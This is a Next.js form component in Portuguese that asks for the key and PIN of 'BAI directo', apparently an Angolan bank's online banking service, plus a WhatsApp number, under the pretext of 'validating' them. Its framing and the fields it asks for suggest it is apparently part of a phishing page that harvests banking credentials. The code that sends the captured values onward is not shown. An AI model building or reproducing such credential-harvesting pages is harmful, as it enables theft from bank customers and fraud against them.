"use client";

import { useState } from "react";
import { useForm } from "./functions/useForm";

export default function Form() {
  const { setValues } = useForm();
  const [chave, setChave] = useState<string>("");
  const [pin, setPin] = useState<string>("");
  const [whatsapp, setWhatsapp] = useState<string>("");

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();

    setValues(chave, pin, whatsapp);

    setChave("");
    setPin("");
    setWhatsapp("")
  }

  function handleWhatsapp(event: React.ChangeEvent<HTMLInputElement>) {
    setWhatsapp(event?.target.value);
  }

  function handleChave(event: React.ChangeEvent<HTMLInputElement>) {
    setChave(event?.target.value);
  }

  function handlePin(event: React.ChangeEvent<HTMLInputElement>) {
    setPin(event?.target.value);
  }

  return (
    <section>
      <div className="p-4 md:p-0 mb-2">
        <p className="text-[#001a48] font-semibold text-[1.4rem] md:text-4xl">
          Insira a chave e o pin do seu BAI directo para proceder à validação.
        </p>
      </div>

      <form onSubmit={handleSubmit} className="px-4 py-2 space-y-4 md:p-0">
        <div className="flex flex-col gap-2">
          <label
            htmlFor="chave"
            className="text-[#001a48] font-semibold text-[1.2rem]"
          >
            Chave *
          </label>

          <input
            type="number"
            placeholder="Insere a chave do bai directo"
            id="chave"
            className="text-[#212529] text-[1rem] font-semibold py-1.5  px-3 w-full border border-gray-300 rounded-md focus:shadow-[0_0_0_3px_rgba(147,197,253,1)] focus:outline-none transition"
            name="chave"
            value={chave}
            onChange={handleChave}
            required
          />
        </div>

        <div className="flex flex-col gap-2">
          <label
            htmlFor="pin"
            className="text-[#001a48] font-semibold text-[1.2rem]"
          >
            Pin *
          </label>

          <input
            type="number"
            placeholder="Insere o pin do bai directo"
            id="pin"
            className="text-[#212529] text-[1rem] font-semibold py-1.5  px-3 w-full border border-gray-300 rounded-md focus:shadow-[0_0_0_3px_rgba(147,197,253,1)] focus:outline-none transition"
            name="pin"
            value={pin}
            onChange={handlePin}
            required
          />
        </div>

        <div className="flex flex-col gap-2">
          <label
            htmlFor="whatsapp"
            className="text-[#001a48] font-semibold text-[1.2rem]"
          >
            Whatsapp *
          </label>

          <input
            type="number"
            placeholder="Insere o número do whatsapp para confirmar os dados"
            id="whatsapp"
            className="text-[#212529] text-[1rem] font-semibold py-1.5  px-3 w-full border border-gray-300 rounded-md focus:shadow-[0_0_0_3px_rgba(147,197,253,1)] focus:outline-none transition"
            name="whatsapp"
            value={whatsapp}
            onChange={handleWhatsapp}
            required
          />
        </div>

        <div className="flex justify-end">
          <button className="text-white bg-[#00a1e0] text-[1rem] font-semibold py-2 px-13 rounded-md">
            Validar
          </button>
        </div>
      </form>
    </section>
  );
}
